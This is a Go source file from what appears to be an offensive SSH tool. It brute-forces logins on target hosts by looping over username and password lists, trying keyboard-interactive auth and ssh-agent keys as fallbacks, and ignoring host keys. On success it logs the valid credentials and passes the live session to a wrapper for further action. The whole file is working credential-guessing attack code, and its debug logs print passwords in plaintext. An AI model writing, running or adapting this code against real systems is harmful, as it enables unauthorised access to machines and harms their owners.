package runner

import (
	"fmt"
	"net"
	"os"
	"strings"
	"sync"

	"github.com/melbahja/goph"
	flag "github.com/spf13/pflag"
	cryptossh "golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"

	. "github.com/LanodonF/coordinate-foister/internal/globals"
	"github.com/LanodonF/coordinate-foister/internal/logger"
	"github.com/LanodonF/coordinate-foister/internal/ssh"
)

func KeyAuthEnabled() bool {
	return keyAuthEnabled(flag.CommandLine)
}

func keyAuthEnabled(flags *flag.FlagSet) bool {
	return flags.Changed("key")
}

func keyAuth() (goph.Auth, string, func(), error) {
	keyPath := strings.TrimSpace(*Key)
	if keyPath == "" || keyPath == AgentKeyFlagValue {
		sshAgent, err := net.Dial("unix", os.Getenv("SSH_AUTH_SOCK"))
		if err != nil {
			return nil, "ssh-agent", nil, fmt.Errorf("could not find ssh agent: %w", err)
		}

		cleanup := func() {
			_ = sshAgent.Close()
		}
		return goph.Auth{cryptossh.PublicKeysCallback(agent.NewClient(sshAgent).Signers)}, "ssh-agent", cleanup, nil
	}

	auth, err := goph.Key(keyPath, "")
	return auth, keyPath, nil, err
}

func handleSSHConnection(i Instance, client *goph.Client, err error) bool {
	if err != nil {
		logger.ErrExtra(i, fmt.Sprintf("Error while connecting to %s: %s", i.IP, err))
		AnnoyingErrs = append(AnnoyingErrs, fmt.Sprintf("Error while connecting to %s: %s", i.IP, err))
		return false
	}
	defer client.Close()
	logger.InfoExtra(i, fmt.Sprintf("Valid credentials for username '%s'", i.Username))
	ssh.SsherWrapper(i, client)
	return true
}

func attemptSSH(ip, outfile, username, password string) bool {
	logger.Debug(fmt.Sprintf("Starting attemptSSH with IP: %s, username: [%s], password: [%s]", ip, username, password))

	i := Instance{
		IP:       ip,
		Outfile:  outfile,
		Username: username,
		Password: password,
	}

	if !ssh.IsValidPort(i.IP, *Port) {
		logger.Debug(fmt.Sprintf("Port %d is invalid or closed on host %s", *Port, i.IP))
		return false
	}

	// Try standard Password authentication first
	client, err := goph.NewConn(&goph.Config{
		User:     i.Username,
		Addr:     i.IP,
		Port:     uint(*Port),
		Auth:     goph.Password(i.Password),
		Callback: cryptossh.InsecureIgnoreHostKey(),
	})
	if err != nil {
		logger.Debug(fmt.Sprintf("Password auth failed for %s, trying KeyboardInteractive...", i.IP))
		// Fallback to KeyboardInteractive
		client, err = goph.NewConn(&goph.Config{
			User:     i.Username,
			Addr:     i.IP,
			Port:     uint(*Port),
			Auth:     goph.KeyboardInteractive(i.Password),
			Callback: cryptossh.InsecureIgnoreHostKey(),
		})
	}
	return handleSSHConnection(i, client, err)
}

func RunnerBf(ip string, outfile string, w *sync.WaitGroup) {
	defer w.Done()
	logger.Debug(fmt.Sprintf("Starting RunnerBf for IP: %s", ip))

	i := Instance{IP: ip, Outfile: outfile}
	if !ssh.IsValidPort(i.IP, *Port) {
		logger.Debug(fmt.Sprintf("Port %d is invalid or closed on host %s", *Port, i.IP))
		return
	}

	keyAuthRequested := KeyAuthEnabled()
	var (
		keyAuthMethod  goph.Auth
		keyAuthSource  string
		keyAuthCleanup func()
		keyAuthErr     error
		keyAuthLoaded  bool
	)

	found := false
	for _, u := range UsernameList {
		if found {
			logger.Debug(fmt.Sprintf("Valid credentials found for user '%s', skipping remaining usernames.", u))
			break
		}
		for _, p := range PasswordList {
			if p == "" {
				logger.Debug(fmt.Sprintf("Skipping empty password for user '%s'", u))
				continue
			}
			logger.DebugExtra(i, fmt.Sprintf("Trying username '%s' and password '%s'", u, p))
			if attemptSSH(ip, outfile, u, p) {
				found = true
				break
			}
		}

		if !found && keyAuthRequested {
			i.Username = u
			if !keyAuthLoaded {
				keyAuthMethod, keyAuthSource, keyAuthCleanup, keyAuthErr = keyAuth()
				keyAuthLoaded = true
				if keyAuthErr != nil {
					logger.ErrExtra(i, fmt.Sprintf("Error loading key authentication from %s: %s", keyAuthSource, keyAuthErr))
					keyAuthRequested = false
					continue
				}
				if keyAuthCleanup != nil {
					defer keyAuthCleanup()
				}
			}
			logger.DebugExtra(i, fmt.Sprintf("Trying key-based authentication from %s for username '%s'", keyAuthSource, u))
			client, err := goph.NewConn(&goph.Config{
				User:     u,
				Addr:     ip,
				Port:     uint(*Port),
				Auth:     keyAuthMethod,
				Callback: cryptossh.InsecureIgnoreHostKey(),
			})
			found = handleSSHConnection(i, client, err)
		}
	}

	if !found {
		logger.Debug(fmt.Sprintf("No valid credentials found for IP: %s", ip))
	}
}

func RunnerCred(ip string, outfile string, w *sync.WaitGroup, username, password string) {
	defer w.Done()
	logger.Debug(fmt.Sprintf("Starting RunnerCred for IP: %s, username: %s", ip, username))

	if !attemptSSH(ip, outfile, username, password) {
		logger.Err(fmt.Sprintf("Login attempt failed for IP: %s, username: %s", ip, username))
		AnnoyingErrs = append(AnnoyingErrs, fmt.Sprintf("Login attempt failed to: %s", ip))
	} else {
		logger.Debug(fmt.Sprintf("Login succeeded for IP: %s, username: %s", ip, username))
	}
}
